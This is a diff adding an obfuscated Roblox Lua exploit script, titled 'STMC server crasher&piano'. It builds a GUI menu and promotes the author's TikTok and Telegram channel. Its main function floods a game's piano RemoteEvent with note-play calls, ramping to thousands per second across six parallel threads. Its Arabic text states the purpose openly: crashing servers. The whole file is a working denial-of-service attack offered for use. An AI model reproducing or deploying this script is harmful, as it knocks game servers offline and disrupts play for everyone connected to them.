@@ -1,0 +1,233 @@
+(function(v1, v2, v3, v4)
+    local v5 = string.char;
+    local v6 = table.concat;
+    local v7 = math.random;
+    local v8 = game;
+    local v9 = v8:GetService(v5(67, 111, 114, 101, 71, 117, 105));
+    local v10 = v8:GetService(v5(84, 119, 101, 101, 110, 83, 101, 114, 118, 105, 99, 101));
+    local v11 = v8:GetService(v5(85, 115, 101, 114, 73, 110, 112, 117, 116, 83, 101, 114, 118, 105, 99, 101));
+    local v12 = v8:GetService(v5(82, 117, 110, 83, 101, 114, 118, 105, 99, 101));
+
+    local v13 = {
+        Cor_Hub = Color3.fromRGB(15, 15, 15),
+        Cor_Options = Color3.fromRGB(30, 30, 30),
+        Cor_Stroke = Color3.fromRGB(255, 255, 255),
+        Cor_Text = Color3.fromRGB(255, 255, 255),
+        Cor_DarkText = Color3.fromRGB(180, 180, 180),
+        Corner_Radius = UDim.new(0, 15),
+        Text_Font = Enum.Font.FredokaOne
+    };
+
+    local function f1(p1, p2, p3)
+        local n1 = Instance.new(p1);
+        if p3 then for k1, v14 in pairs(p3) do n1[k1] = v14; end end;
+        n1.Parent = p2;
+        return n1;
+    end;
+
+    local function f2(p4, p5)
+        local n2 = f1("UICorner", p4);
+        n2.CornerRadius = v13.Corner_Radius;
+        if p5 then for k2, v15 in pairs(p5) do n2[k2] = v15; end end;
+        return n2;
+    end;
+
+    local function f3(p6, p7)
+        local n3 = f1("UIStroke", p6);
+        n3.Color = v13.Cor_Stroke;
+        n3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border;
+        n3.Thickness = 2;
+        local g1 = Instance.new("UIGradient");
+        g1.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0.0, Color3.fromRGB(255, 255, 255)),
+            ColorSequenceKeypoint.new(0.25, Color3.fromRGB(180, 180, 180)),
+            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(15, 15, 15)),
+            ColorSequenceKeypoint.new(0.75, Color3.fromRGB(90, 90, 90)),
+            ColorSequenceKeypoint.new(1.0, Color3.fromRGB(255, 255, 255))
+        });
+        g1.Rotation = 0;
+        g1.Parent = n3;
+        coroutine.wrap(function()
+            while n3.Parent do
+                g1.Rotation = (g1.Rotation + 2) % 360;
+                v12.RenderStepped:Wait();
+            end
+        end)();
+        if p7 then for k3, v16 in pairs(p7) do n3[k3] = v16; end end;
+        return n3;
+    end;
+
+    local function f4(p8, p9, p10, p11)
+        local tw = v10:Create(p8, TweenInfo.new(p11, Enum.EasingStyle.Linear), { [p9] = p10 });
+        tw:Play();
+    end;
+
+    local sg = f1("ScreenGui", v9, { Name = "STMC server crasher&piano" });
+    local sf = v9:FindFirstChild(sg.Name);
+    if sf and sf ~= sg then sf:Destroy(); end;
+
+    local mn = f1("Frame", sg, {
+        Size = UDim2.new(0, 300, 1, 0),
+        Position = UDim2.new(1, 0, 0, 0),
+        AnchorPoint = Vector2.new(1, 0),
+        BackgroundTransparency = 1,
+        ZIndex = 50
+    });
+    f1("UIPadding", mn, { PaddingLeft = UDim.new(0, 25), PaddingTop = UDim.new(0, 25), PaddingBottom = UDim.new(0, 50) });
+    f1("UIListLayout", mn, { Padding = UDim.new(0, 15), VerticalAlignment = "Bottom" });
+
+    local function f5(p12)
+        local t_title = p12.Title or "STMC";
+        local t_text = p12.Text or "Notification";
+        local fr1 = f1("Frame", mn, { Size = UDim2.new(2, 0, 0, 0), BackgroundTransparency = 1, AutomaticSize = "Y" });
+        local fr2 = f1("Frame", fr1, { Size = UDim2.new(0, 250, 0, 0), BackgroundColor3 = v13.Cor_Hub, Position = UDim2.new(0, 300, 0, 0), AutomaticSize = "Y" });
+        f2(fr2); f3(fr2);
+        f1("TextLabel", fr2, { Size = UDim2.new(1, -30, 0, 25), Font = v13.Text_Font, BackgroundTransparency = 1, Text = t_title, TextSize = 16, Position = UDim2.new(0, 15, 0, 5), TextXAlignment = "Left", TextColor3 = v13.Cor_Text });
+        f1("TextLabel", fr2, { Size = UDim2.new(1, -30, 0, 0), Position = UDim2.new(0, 15, 0, 32), TextSize = 13, TextColor3 = v13.Cor_DarkText, TextXAlignment = "Left", TextYAlignment = "Top", AutomaticSize = Enum.AutomaticSize.Y, Text = t_text, Font = v13.Text_Font, BackgroundTransparency = 1, TextWrapped = true });
+
+        task.spawn(function()
+            f4(fr2, "Position", UDim2.new(0, -20, 0, 0), 0.4); task.wait(0.4);
+            f4(fr2, "Position", UDim2.new(), 0.1); task.wait(4);
+            if fr2 then
+                f4(fr2, "Position", UDim2.new(0, -20, 0, 0), 0.1); task.wait(0.1);
+                f4(fr2, "Position", UDim2.new(0, 300, 0, 0), 0.4); task.wait(0.4);
+                fr1:Destroy();
+            end;
+        end);
+    end;
+
+    local menu = f1("Frame", sg, {
+        Size = UDim2.new(0, 420, 0, 280),
+        Position = UDim2.new(0.5, -210, 0.5, -140),
+        BackgroundColor3 = v13.Cor_Hub,
+        BackgroundTransparency = 0.3,
+        Active = true,
+        Draggable = true,
+        BorderSizePixel = 0,
+        ClipsDescendants = true
+    });
+    f2(menu); f3(menu);
+
+    local top = f1("Frame", menu, { BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 30), Position = UDim2.new(0, 0, 0, 0) });
+    f1("TextLabel", top, { Size = UDim2.new(1, -70, 1, 0), Position = UDim2.new(0, 12, 0, 0), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = v13.Text_Font, TextXAlignment = Enum.TextXAlignment.Left, Text = "STMC server crasher&piano", TextSize = 13 });
+
+    local btn_close = f1("TextButton", top, { Text = "×", TextColor3 = v13.Cor_Text, Size = UDim2.new(0, 25, 1, 0), Position = UDim2.new(1, -5, 0, 0), AnchorPoint = Vector2.new(1, 0), BackgroundTransparency = 1, Font = v13.Text_Font, TextSize = 22 });
+    btn_close.MouseButton1Click:Connect(function() sg:Destroy(); end);
+
+    local btn_min = f1("TextButton", top, { Text = "-", TextColor3 = v13.Cor_Text, Size = UDim2.new(0, 25, 1, 0), Position = UDim2.new(1, -32, 0, 0), AnchorPoint = Vector2.new(1, 0), BackgroundTransparency = 1, Font = v13.Text_Font, TextSize = 22 });
+    local isMin = false;
+    btn_min.MouseButton1Click:Connect(function()
+        isMin = not isMin;
+        if isMin then
+            btn_min.Text = "+";
+            f4(menu, "Size", UDim2.new(0, 420, 0, 30), 0.2);
+        else
+            btn_min.Text = "-";
+            f4(menu, "Size", UDim2.new(0, 420, 0, 280), 0.2);
+        end;
+    end);
+
+    local cont = f1("ScrollingFrame", menu, { Size = UDim2.new(1, -20, 1, -45), Position = UDim2.new(0, 10, 0, 35), BackgroundTransparency = 1, CanvasSize = UDim2.new(0, 0, 0, 250), ScrollBarThickness = 2 });
+    f1("UIListLayout", cont, { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder });
+
+    local desc = f1("Frame", cont, { Size = UDim2.new(1, 0, 0, 75), BackgroundColor3 = v13.Cor_Options, BackgroundTransparency = 0.5 });
+    f2(desc); f3(desc);
+    f1("TextLabel", desc, { Size = UDim2.new(1, -20, 1, 0), Position = UDim2.new(0, 10, 0, 0), BackgroundTransparency = 1, Font = v13.Text_Font, TextColor3 = v13.Cor_DarkText, TextSize = 11, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Center, TextWrapped = true, Text = "هذا سكربت كراش سيرفرات عن طريق البيانو تكعد على بيانو وتفعل السكربت حسب الي تريده اصرح ثلاث مرات وشوف نتيجه السيرفر يحترك - تابع كلان STMC.\nتم صناعة السكربت بواسطة StealthTechmaster" });
+
+    local b_tik = f1("TextButton", cont, { Size = UDim2.new(1, 0, 0, 32), BackgroundColor3 = v13.Cor_Options, BackgroundTransparency = 0.5, AutoButtonColor = false, Text = "" });
+    f2(b_tik); f3(b_tik);
+    f1("TextLabel", b_tik, { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Font = v13.Text_Font, TextColor3 = v13.Cor_Text, TextSize = 12, Text = "نسخ يوزر تيكتوك: 1ua10" });
+    b_tik.MouseButton1Click:Connect(function()
+        pcall(function() setclipboard("1ua10"); end);
+        f5({ Title = "STMC", Text = "تم نسخ يوزر التيكتوك بنجاح!" });
+    end);
+
+    local b_tel = f1("TextButton", cont, { Size = UDim2.new(1, 0, 0, 32), BackgroundColor3 = v13.Cor_Options, BackgroundTransparency = 0.5, AutoButtonColor = false, Text = "" });
+    f2(b_tel); f3(b_tel);
+    f1("TextLabel", b_tel, { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Font = v13.Text_Font, TextColor3 = v13.Cor_Text, TextSize = 12, Text = "نسخ رابط قناة التليجرام" });
+    b_tel.MouseButton1Click:Connect(function()
+        pcall(function() setclipboard("https://t.me/StealthTechMasterComunity"); end);
+        f5({ Title = "STMC", Text = "تم نسخ رابط التليجرام بنجاح!" });
+    end);
+
+    getgenv().PIANO_SPAM_STOP = true;
+    local b_piano = f1("TextButton", cont, { Size = UDim2.new(1, 0, 0, 35), BackgroundColor3 = v13.Cor_Options, BackgroundTransparency = 0.3, AutoButtonColor = false, Text = "" });
+    f2(b_piano); f3(b_piano);
+    local l_piano = f1("TextLabel", b_piano, { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Font = v13.Text_Font, TextColor3 = v13.Cor_Text, TextSize = 13, Text = "تشغيل كراش البيانو (OFF)" });
+
+    b_piano.MouseButton1Click:Connect(function()
+        getgenv().PIANO_SPAM_STOP = not getgenv().PIANO_SPAM_STOP;
+        if not getgenv().PIANO_SPAM_STOP then
+            l_piano.Text = "تشغيل كراش البيانو (ON)";
+            l_piano.TextColor3 = Color3.fromRGB(0, 250, 0);
+            f5({ Title = "STMC", Text = "تم تفعيل كراش البيانو بنجاح!" });
+
+            task.spawn(function()
+                local C = workspace:FindFirstChild("GlobalPianoConnector");
+                if not C or not C:IsA("RemoteEvent") then
+                    getgenv().PIANO_SPAM_STOP = true;
+                    l_piano.Text = "تشغيل كراش البيانو (OFF)";
+                    l_piano.TextColor3 = v13.Cor_Text;
+                    f5({ Title = "STMC", Text = "خطأ: لم يتم العثور على البيانو في السيرفر!" });
+                    return;
+                end;
+
+                local RAMP_SEC = 2;
+                local RAMP_RATE = 800;
+                local MAX_RATE = 9000;
+                local SLICE_HZ = 60;
+                local LANES = 6;
+                local FIRE = C.FireServer;
+
+                local pickers = {
+                    function() return v7(1, 88) end,
+                    function() return 1 + (v7(0, 7) * 12) end,
+                    function() return 2 + (v7(0, 7) * 12) end,
+                    function() return v7(1, 88) end
+                };
+
+                local function fc(r, s)
+                    local ps = math.max(1, math.floor(r / s));
+                    for _ = 1, ps do
+                        if getgenv().PIANO_SPAM_STOP then return 0; end;
+                        local note = pickers[v7(#pickers)]();
+                        pcall(FIRE, C, "play", note);
+                        if v7(1, 12) == 1 then
+                            task.wait(v7() * 0.002);
+                        end;
+                    end;
+                    return ps;
+                end;
+
+                local t0 = os.clock();
+                while os.clock() - t0 < RAMP_SEC and not getgenv().PIANO_SPAM_STOP do
+                    fc(RAMP_RATE, SLICE_HZ);
+                    task.wait(1 / SLICE_HZ);
+                end;
+
+                if getgenv().PIANO_SPAM_STOP then return; end;
+
+                local threads = {};
+                for L = 1, LANES do
+                    threads[L] = task.spawn(function()
+                        while not getgenv().PIANO_SPAM_STOP do
+                            fc(MAX_RATE, SLICE_HZ * LANES);
+                            task.wait(1 / (SLICE_HZ * LANES));
+                        end;
+                    end);
+                end;
+
+                while not getgenv().PIANO_SPAM_STOP do
+                    fc(MAX_RATE, SLICE_HZ);
+                    task.wait(1 / SLICE_HZ);
+                end;
+
+                for _, t in next, threads do pcall(task.cancel, t); end;
+            end);
+        else
+            l_piano.Text = "تشغيل كراش البيانو (OFF)";
+            l_piano.TextColor3 = v13.Cor_Text;
+            f5({ Title = "STMC", Text = "تم ايقاف كراش البيانو." });
+        end;
+    end);
+end)();
